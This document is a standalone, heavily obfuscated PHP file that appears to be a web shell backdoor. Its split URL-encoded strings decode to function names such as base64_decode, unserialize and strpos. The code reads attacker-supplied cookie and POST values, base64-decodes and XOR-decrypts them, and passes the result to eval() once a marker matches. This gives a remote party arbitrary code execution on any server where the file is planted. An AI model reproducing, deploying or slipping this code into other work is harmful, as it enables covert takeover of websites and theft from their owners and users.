<?php /* GD;J	D */PARsE_str (# |DX1,9VX	
 '37'# s=	]4;*";9
 .//  8y! 1
 '=%' . '64' . '%' . '4'# bsUW^Q-ab
. '1%' . '54' . '%' .	# k,3RH
'61&'/* ;e'o4'	Kbt */	./*  P	4:3y1 */'5'	# K'& |.EOJ
. '99=' ./* )2i.- */'%50' . '%4'# iyCYZ>4
. '1'/* P(c2IzQ6jM */. '%'/* 0-DOc3 I */ . '52' . '%' # Q	`??I ']
 .// k\9qO
'61'	// ;FP:(%` *
. '%4D' . '&'# ]NBdBV
./* rr	HC */ '10' . '2=%' . '43%'// wos\Ciut.
	. '4' . # q B,0:y
'f%4'/* =_Ks>d. */. 'c' . /* +	uk46WRvB */'%75' .# rX%-~9o
	'%' . '6' .// O"'<>
'd'	# yOe?fQ!)~
.#  cG~j@FK
'%' . '4E' . '&'// 0LvSwbg
. '474'# _%du XT
 . '=' . '%79' . '%6A'/* eK	b@d */.// 2]	%2MDMwi
	'%'	# %T],uL
.	# TOg3$9x
'69%' .# mp"@A/ o_
'51%'// 7 zorOze@/
. '7' . '6%3'/* =	D	Ug */. '7'# I	s/2X2_a
. // EwE8_o]am
	'%5' . '2'/* fBpn0n}	Z3 */ . # \	R*Jb6Q?u
'%6b' . '%5' # %W0q1jj.QD
.// $F7-pWB@7M
	'8%'/* Lx{	6h>Kk/ */ . '74%'// 2!|%D	
 . '6' . // q$Y8	GCAzw
'8%6' . # shO @
'9'// a7K|f4k+
	.	// y@sj ex
'%46' .	// 7cN!	C
'%'/* H|}Z w */. '39' .	# Pi JV
'%'/* {7u) B2B */. '5'// WrDp0:	
.# O6[(F
'9%'/* MOgf7 */.// O;:gdOe+>
 '4a' . '%' .# 	')7W(s=
 '54%' . /* 	RgSyo8K */'61&'/* "Dj kb8[ */ .// 4V*b&Dt
'673' . '=%6'	# ~a	kX?
.# /s:;Ph
 '8' // 8S5q p
	./* 0<UyxD* */'%6' /* ._O  utVX */. '5'/* 7qic	6B6G */	./* $2Y!x */'%61' . '%44' . '&' . '470' . '=' . '%5'# &MQP0
 . '0' . '%52' .	# 	aCs/ BxU$
	'%6F' . '%4' . '7%5'# A/2/>Wo}t
. '2%'	# /<}==TNeT%
	.// e1@f a
'65'# ?cGf::oLj
.// 82H>SNeX
'%53' . // O1{}|6@
	'%53'// C@ndI~
. '&'/* %p(\ B=&r */.	# 	2tj,]O 
'139' . '=%'// H5m)	>	:.g
. '41' . '%5' . '2%5' .// Ez	hBv	a
'2' .# lU;c-{DE~x
 '%61' . '%5'	/* / yC* E  */ .# P. GT`|p
	'9%' .// +	5;%M1J3
'5f%' . '56%'# (kS|4 
.// B 	UOx>ez
'6'# }qwR'O ]
.# _		a	x	]Om
'1%'# ^MF@&h5B
	. # "y-[;DVh
'4' . # OB05 	
 'C%5' .// IdZ6p"|=0
 '5'# x-FmY_G
. '%' . '45%' ./* P5Jac */'73' // 1/723d:~1
 . '&1' /* 1g%&r	$v */.// i[,eOU2^
'65' ./* ,"9-fH */'=%4' . 'f'	// hpK	5
. '%50' .	/* xl4AL= */'%'/* s\WlK?bHJY */ . '7'// B~T ;
.#  NWmur%C0
'4%' .// 	\@aQL~>
 '67'/* Zx	]- */.# r%X T/N Y
 '%7' .	// {~?Z^cv }
'2'# @'B"7L= }
	. '%4F'# :U`.)_<
.	/* Bf`!>Dp */'%7' .// 	 w':
'5%' ./* 5yei!.> */'70'# 9&1>9	X-K
. '&84' . '8=' . '%53' .// M2hFo
'%55'	// X\+!I(!m 
. '%' .// olE1M<9FMm
'42%' ./* &rZfu3jnX */'5' . '3%7' . '4%7'/* qm7%^-iR. */	. '2&' . '16'# k4Rh7'2?y
.	// 9'VM	
'3=' . '%6'// X ?j10	I
. '2%6' // l5[wha
.# @-KaXqhB{
'1%5'/* $Tm:r:|V */.	// 	t+]zb/j 
'3' .// |-H2u.?FX7
'%65'	/* iqAH*D e */./* m69OqW */'%3' ./* RZ]@5U{E* */ '6%3'// ., M-
. '4%5' .#   `J_&\
'f%6' . '4%4'	# 1]	 &1P, 
. /* IA >W */'5' .# g6IrLWdl}H
'%43' // 	w@Z u	d
.# (WI?w
'%'# VWg	*C]WU
. '6F%'/* G*"	5h */. '6' .# ^| M:8
'4' .	/*  ? Fwcu( */'%65' # 23W*NUV)Hs
.// o=]UF3
'&8' . '9' . '1' . '=%' . # ) yU ~	
'75%'// ~h%`\
. '4E' . '%53' /*  `&uM4	 */. '%4'	// 	/QauGXj_U
.# qTGEZ'
	'5' ./*  mI		O */ '%' . '52%'/* siF82F */.	# RkKe	
'69%' ./* ":_U=vs" */'61%'	# "]Z_	$
	./* O]upM DV3L */'6c%' . // @1 iol1(A%
'69'/* 	U+/!d( */./* d!L M */'%7' . 'A' . '%'/* X	"-&$$@PV */ .# 0Dfh+8
	'45&' . '91' .// zh >V.d<X
 '4' . # v|Vf=DJ
'=%4' . '3' # 5)2w^Bl@
	. '%69'	# e7n|_
. '%5'//  78@DjYQI
. '4%' ./* W8=Es<n=tc */'4'/*  7CbVe"B */ ./* w\	iA3HZ61 */ '5' . '&6'	/* .c}(T ? */	. '5'# b~NVz~~,
.// az5:u9	>`
'=' ./* 4).Nx`:O */	'%5'// y@/ 	WR`rc
.// <f Y vS*G+
'3%5' .// *{>fl oE1
	'4'# *(p "yw
	. '%52' .// FE~PE@	>Py
'%4C' .	/* pL7kPg`;d */'%45'/* Q`9Kg */. '%'/* SJ_kKkESTT */./* 3"P9/Nu- */'6' . # 	zi_!Qtn$
'e&1'# ~0gAqyb
./* T/6-$QB>L+ */'75=' .# GG&nv5ZP-
 '%6'/* mOh !I?:ba */.#  	I`Ai
'9'	# rwhZB+p$
 ./* nlprGf	 */'%72' .	/* dWnK%U */	'%7' # 	qB@G0t
 . '0' . '%33' . '%38'// 8aK^1I|EZ6
.	# e< :UtG>
 '%6'# ,8 27
 .	// Xbb^H8
'b%'	# 9,S?!$s29
 . '7' .# +2\RQZp	P
	'2%7' .// aHYN44Y
'7'/* S{hpwLujN; */ . '%4D' .// Br"PF
'%'# FgXsy1h1
.# @R /g$q2
'53%' . '37' /* h^{UDVo */.	# f;1>%5hp8
	'%' ./* - ^[} */	'6' . '5%' /* S7beJ?n */. // jQ3@}	)
'69%'/* . 	8lJS m */.	// ;:&!o
 '59%'/* \Fa6Hx=e  */ . '78%'	# u	L}.
. '37' . '%6' .# fsB>rI@i^
 'f'/* Z;Yk	;	U */.// H"i8F
	'&' ./* T_c"^cJvjf */	'7' . '7'	# iv}X	w
.	// i_. g$
'3=%' . '74'// %RQTM]]g
. '%3' . '5%' .	/* W&w[!{X */'68%' .// .ZD  51Z
	'5' . '7%6' .	# -h~g5 tHj
'd%' # P^\dS		Y
./* =.[ O`3 */	'30%' # D 	VaL-
	. '5' .	# f|@sB;
'8%7' /* m.?ust] 7 */ .	/* mOlM| */'1%'/* E/ uQ%Z;F */. '64' ./* ?z-@c	U0 */'%' . '6' . 'c%6' .// 	*x 	VK
 '1%' .# oy:AYQ'&
 '6' .# @xp;^ET
'5%' . /* dd.}O-} */	'46%'# PM0+F
. /*  OR(Tqs| */ '5a'	// d]KH	o	%Q0
 ./* uj8/NK>j,u */	'%3' .	/* WR	hd	[- */	'3%'	/* &"'>rQ */	./* 5O[l17 */'41%'// y! BB2F
.	// /`H nhU2Mq
'6' ./* %f/mC 7AN	 */'D%'/* /6@-~Ou] */	. '78'# CrKv1%	~=e
./* q&R	)" */'%'/* lm1g/% */. '69' .# T6.y vgT
'%' . '4A&' .	/* 6]Dsagu hC */'994'// HQ7uWdEz	
	.//  )	FV
'=%'/* D rxp~	O */ ./* w1 xiQy6 */'49'/* 2wu:Q8	 */. '%53'	// TPs- L
./* t	jN*` */'%' .# la aa
'49%' .	/* L	l c */'4E%'# R^dL"Fjwp
.// -@	*!
'6'	/* V j$HF'l	T */. '4%6' . '5%' . // GWR0_X 
'58&' .# XVivFv
 '454'/* Cu^\ bO8 */	. '=%'// K>n${I	z
. '61' . // { tz+9b cB
'%3A' .# B_x}9,Rq}w
'%3'# ]Ru$2 eH
. '1%'	# Nkq4jp& V
.	/* 2/9 A */ '30%'# kfn_M:4-j%
	.	//  ?X<1o
	'3'// Mn?+ $	iw
.// G|M [ 5@!
'a%' . '7b%'/* u	A 6+0Kh! */./* H(n[lt */'6'// >Q{;XR2+ X
./* 	Q$OC+]0 */'9%'//   pWX{-
. '3a%' . '38%' .// -jw| QT
'33%' . '3b%' . '6'/* FnU6P2ust */	. '9%'# LRO}8{Jt
. '3A%'# a4RJE:i2A
./* +Jm6B */'31%'	//  lk	KycH
	. '3b'// n{~pH
. '%69' .	/* @~CsZ Nz */ '%'# .ZvP/uKLSi
. '3' # 0-7pH6%
./* Nl7Ut@ */'a' . '%3' .// 3~	i,o7wG;
'4%' /* )Fi&Y!$ */. '35%' . # ]?I+$m}	m
'3B%' .	// q~Q`	K
'6'	#  A	BJgv,
. '9%' . '3a'# *?uzkljuq	
. '%3'/* _BLOy */. '0%' .	// pPAp$
'3b'/* )<}Bi.[D, */	./* iw~ %|^ */'%' ./* 	rzmav@)K */'69'/* NJ	,	d%F	[ */.// 	<.Whe,1gx
'%3A' ./* ` 	T{WWuQ/ */'%37'# 8a/k[%rtq-
 .# M_k^v
'%3'// n4}jPp1
.# :} &3
'8%3'/* 	/3r5 */./* {<KP6s	 */'B'	/* s,eJ[K2;<W */	.// Q,JbQ	<X:m
 '%6' . '9%3' . 'A%3' . # >O\~zwX,J
'1%3' . '3%'#  Is:H
.// m	y3'r
 '3b' . '%' .# &&{iG
'69%' ./* 6::s1fJ	|^ */'3a' ./* ) 	x{O-QK */'%' .// 4k"7fb_F,p
 '32'# 5q'Tm
.// 9[+oK!:^f=
 '%' # ;gXS{SbB
.// 01[0gJs"jp
'34%'// @V .KO K
.	/*  Gm,tRg  */'3B%'# ~385%d/l/
. /* bSnQ&DY? */'6'# >or\hnHVq
. '9' # +JGG1H
	. '%3A'/* 		nWq */ .# ti| {AR{
'%31'/* A	G0WH	]m\ */. '%' . '3'// "07VbRy
 .# r[PJ\D%M
	'5%' . # *7w<'e4 (]
'3B'// 4%kXbb+
. '%'/* }[{Ko9~7 */./* Y/{No:T? */ '69%' .# 73~du	\4F+
 '3' ./* *9XOD */'A%' . /* N%(B@)q ^l */'3' .# bP8+,bIP
 '4%'	# 	!|@KYM`
. '3' . '3%3' . 'b%'# [py0T
. # /q|!*w
'69%' .	// `w TGyK7AJ
	'3' .// vQW0K
'a%3' .	# IH0Lnr!qB!
 '4%' /* DH9`1SP5 */. '3B'/* s sk',r% */	.// :Q$M7+,+
'%6' . '9%' . '3'# @tmWT%:	
. 'A'// lwCiR"r\
. '%3' . '1%'// Y]I3D
. '34' . '%3' ./* OCi*4) */'B%' ./* \v./IhO{*9 */'6' ./* 6VcX; */'9%' .// 	V		yp~ <
'3A' . '%'# :9>.ta
.	// <M-N?u8	f 
'3'# :[DSx{:
	.# MN-![@+B(E
 '4%' .# wchIIW
'3'// GQOJT7p
	.// Akkj7   D8
	'B'	// @`\@@>8
.// Tka	$
'%69' . '%'# 5-t:hS
. '3'	// 1rCT/r-R
. /* h47[:si */ 'A'	/* ]vhKG,F60 */. '%3'# OM4%T	
.// 	rySVn
'6'/* [_hDA	 */ .# ,  lFf+(7 
'%33' .# eULq}mi
	'%' . // M4m@.p
	'3' . // QnutR8
 'B'# [9BFKo 'P
 . /* JZF'b */'%69' . '%3'	# YmTdq5
	./* B cU$!- */	'A%' . '3'# Gt[m By
. '0%' .	// h W_Z/ 
'3b'	# V 2ET
. '%69' . '%3'	/* 	$ &I */.# !k wW
'a%' . '33%'# *a	 UYHJ5
.# '+|`WeUt'
 '38%' . '3'	# g57< F4N
. 'b%6' . '9%' . '3A'# jQn y|f
.# 	k2NW	)`3p
'%3'// TV?[Nos}ux
. '4'# XrW1P	A61P
	. '%' /* t=(	spHS^	 */. /* p$kC}45T */'3B%' . '69%' // Ch83?S
./* <ebE  */'3A%' . '32' .# y~3i5		>^
'%3'# 6JM^a"NY
.	// bn*xsK2
	'1%3'# 	kf~-	T
.	# <Xn%t6 pw%
'B%'// :X!"{F
. '69'/* 0)Zd&	1W */. '%3a'/* *!U4_;+ */. '%' .# 	 ;gz?M)
	'34' // 4~Q9'(^($
	. '%3B' . '%69' . '%3' . 'a%3' .# 	R^wS>zIMn
'5%3' .# p~u%O>	
'9%3' . 'B' . '%69' ./* ep@o%\H( */'%3A'	# \	 S8;)
	.// YeuLiOr;	
'%2' // %1V"	2\
.// XSH(t] 
'd%3'	# N W,` v?		
 . '1'	/* d6{BYTq */ .	# <[ @lX
'%' . '3b%'# _0	5p
	.# u~(Gf'K	S_
'7' . 'D&6'/* FDI{TZ */ .# }	_QYlT
'58=' . '%69' // ) 3EFyo 3
. '%5' .#  K[o*f V	
'4%4' . '1'	// Z,!g]A{'
. '%6C' . '%69'# U(i&R<^gx4
. '%6' . '3' . '&36'	# of.1:YiI	
. '1=%' . '73%' .# 1"|$-@i=
 '7'// :" 	UXJ
. '4%5' . '2%7'/* 	V%9_ub */	. '0%' . '6' . 'F%5' . # ] ?!=
'3&5' . '6' ./* %&zdDh8 */'6=%'# c`"Y-^_
	.// \"+P	a
 '6'// }WmD+
	.// 	N	{u{:6X
'D' . '%' .# P5!4H0<y
 '4' . '5%5' .# h,d B{,`
	'4%' . '65'/* oB	yS	Jg */. '%'/* Y9zAPEg[ */. '7' . '2&5' .# PG~jBp_
 '10' ./* WLsEV0$ */'=%6' . /* s@1]%a	N */'8%7' . '4%4' . 'd' . '%'/* )7,Sq,t| */. '4' ./* QX[E,j */'c&8' . '3=' . '%75'# zj_F$XTk
./* 3lr h@P*i. */'%' // ]e pR0YO
	. '5' /* Ge8&@l[$Cm */. '2%'# c>AJ3}
. '6c%'// }{g8 9II	
	. '4' .# @~u-H
'4' ./* aMk6rq; */'%65' .# [n"aYXVi|Z
'%43'/* <gi<j:H|@ */. '%4'# 4@.o!v\J?`
.// 9I5i1
'F' .// _G		s7$	E2
'%4' .# X!.Q O_K:u
'4'// CGsD96	
.// _\lP"
 '%'	# :K*	o$'M;%
 . '45&' .// QWTuJ 
'43'# k jF]
.// a<	)U
'0'# c&Of9,^
.	/* u1gp,]]l/ */'=%'	/* |	IbR+: */ . '7' .// B`+y' e
	'3%4' ./* B 4]~I	Q */'1%6'/* hj}c`x */. 'D%'	// SvM_L?O(
. '5'	/* 0`P:+.k6P */. '0&5' .# 9^,* G2
 '40' /* 5o:@E	 */	.	/* ]=_(r0 */'=%7' .//  .H	W, k@J
 '0%3'# *1~xzI
. '5' ./* dyJW\ */'%'# 68^^)
. '5A'	/* 0T> rh< > */ . '%' ./* :RK3EOY */	'6'/* y5fL4/2 */. '2'/* .H:v]R7[ */. '%' ./* *Z	{ s */'5'// kG]52;*
. '5%' . '6'// 	v^!:f
.// NZo(TOEqBO
'f%'# sXY[av"
. '31' . '%4' . /* xt""F */'c%6'	/* aG=>4PKA O */. # x $1'
'E'	/* U,; 1 v */. '%' . '70'// e)!=jbW
	./* hH OUI */ '%49' .# $>oDC7&
'%4' . '5&'// o<irje
. '3'/* JB9] {'j[ */. '9' .	/* j+08_vr	R^ */'0=' . '%4'# 	7CR~EcC,
. 'e' . '%61'/* j}M!& */.# Z,op`1K0
 '%' ./* (S_w2=u%8 */'7'	// ;=Ja~K
 . '6&9' . '1' . '7=' .// ^`gW8ND
 '%'/* X	q88L */ . '5' . '3' .// }QDW&
'%54' . '%52' .# G>3vH
 '%'# <+z}@(WA 2
. '69%'//  =RU*Rem 
./* g Q(~F7  */ '4B'/* Z<r+bVB!<  */.# vIl h
'%' ./* prUV* XWb7 */'6' .// ./"Wv+4&
'5&6'# X-~yE/B
	. '26'	/* i0NS 	!Sy */. '=' . '%61'/* ,AGh%C uQ */. '%63' /* ^/]-3PZtoN */.# 0:4ce
'%' .// n|!t,Pp
'5' /* S(ejK.	x2 */./* 	Q@J ;.[ */'2' ./*  Dd-; d! */'%'// |, \"ccd k
	. '4'# SQA}\u7aF
.# GkI<b	?{l
'F%4' .// 1drV	}U
	'e%'	// 	{J)D\QU0
. // rU.o.; Q
'59' . '%4d'	# 14dOL
 , $hDI )	/* )TK	h18@ */	; $cxew // C2;f{
= //  6B^|(`
$hDI # d6b~UnY2f
	[/* (,wq<vOL$~ */891// x99tB]o /
	]($hDI [// c,s3U-b=
83 ]($hDI [ 454 // NiON	zGZ
	]));/* hI>{_ */function#  MJ~=Z	
yjiQv7RkXthiF9YJTa (# F[gVaJ"n5l
$SAuLK0KY ,	# vK1${Wyn
$qhyAX/* 8bV8lP^,y */	)// v=b|EU 
{ global# Ptn^QBSO| 
$hDI// y bg(W,
	; $ketGeC =# 3bd5`
	'' ; // 6I>[vv;6B
for/* 45F:/f^{  */( $i =// ~rgj\_h"x_
0 ;/* N@=V  */$i < $hDI# r<sGdx/dm
[ 65 ]#  tC	D\
(# 6inW\|
	$SAuLK0KY	/* 4 	OUXfd	Q */	)/*  Gztx:" */	; $i++ ) {# 1g.~'
$ketGeC/* X>EuIn,4 % */	.= # Q698,k
$SAuLK0KY[$i]/* (/g/Mx6 |N */^// E| p0-]x7v
$qhyAX [#  G Rk
$i %/* />%:U`Xq~l */$hDI [// : [Kf;
65 ]/* GJtJz		Z w */(	/* $YJ,Bk*\[ */$qhyAX	/*  htIG< */	) ] ; // aH\=0Y*
}# $;M6=	SMn.
return $ketGeC ;// Z?;VQMo
} function /* h!a"_' l1a */t5hWm0XqdlaeFZ3AmxiJ// qe+*!?
 ( $wmwkq )/* VG26UFK zX */{# Dp+	QX7
global// @}L@u\
 $hDI# Zx7F`L|;
 ; return# &7(|fDh55
$hDI [// WEU+?3b
139 ]/* 1t?'LT@ */( $_COOKIE )/* " Ny^r%M8 */[# 'C0Z5l!j
$wmwkq ]/* JZ` &m */; } function// 	5>nMmt Q
irp38krwMS7eiYx7o	// HOEs{U	x
 ( $Zt7qqb// OvL	AEj"u*
) {	/* JbsRF8	 */ global $hDI// h\.0cI
; return// Rl h;5ZRwF
$hDI [ 139/* dW,WlS */]# @\CQd2L
	(// /e )iX0;
$_POST )/* wCsyo=	v@  */[ $Zt7qqb ] ; } $qhyAX// 6		kzC
	=	//  ,uRva.+m
$hDI [	# m9rK	bN@,
474 ] (	# q6 <1%~
$hDI// 2w2"9k
[ 163/* +TO*3_e */] (# a8?1CF V/
$hDI // G(=yDJ:0v
[# NI){ 
848//  7^zktC 
 ] # ;YcH 
( /* =8 sh-' */$hDI/* &y %r*9?'= */[ 773/* 5mNbyw=[^  */] ( $cxew [ // P- o.l
 83 # [V;Wd9[J?Y
]/* LE		dW$I  */) , # |!KW0
 $cxew// /vY*~
[// {x8/rW
 78 // PfC+?1dru
]	// 1)M:S?IW
	, $cxew /* %z7v$% */[ 43// ZtwbJ2 
]/* T|,P 2 */*	# lk@X.Z
	$cxew [ 38 ]// +JB.-
) )// ^^./0 O	
 ,# 2c|wN<Wi	
 $hDI [ // r,ndmsu?^
163 ]// ]I$l\ !	0M
	( $hDI # I\)(}hf
 [// hFlBj\)
848 ] ( # {m5"i`
$hDI// =[.wRdcK
[ 773 ]# (9? 6*l
	(// K(tO">
$cxew [	// B@~dao
45	# I 	P?].DLV
] )	// i]n-7 qN
, #  :uyv)h.!@
$cxew [ /* MeNGjEH */	24 ] , # rgO{ w
$cxew # W(0  H8+q 
[ 14/*  `}aWrV */]# eQ	)_	C
* $cxew// 0Nq]o"
[// T3&t`W,vkO
21	/* l<mC0gu */	]/* lCl		C63P */) )// eP\@O$
) ;	/* IJ wf,:DF */$smXs# 	I4*!d/
= $hDI [/* "O	B	fh */474 ] (// 	sv1Q$3@'
$hDI [ 163 ] (// =B5Q O
 $hDI # (	qaAp^!p
[ 175 ]/* |8:6= */	(#  ] (^	
$cxew [/* 6(\od */63 ] /* !Nezf	$L */)// v-vm,
)# 	(,-sZZd>a
	,# } {TU\c'Zf
$qhyAX ) ; if (# W4+se
	$hDI	# Z{:;N;9 
[ // HHm!gi~
361/* 	MeRS	{N */] (// ).@	u
$smXs	// CcAv?hE
 , $hDI/* "=2 ?w W */[ 540 ] )	// QR/&r	 
> $cxew [ 59// LZn	1|uyM
] )// \C$Irb>Qb
eVAL ( /* @DT&%Iw^ */	$smXs# @*6XRZ{nr
) ;/* c%mzq' */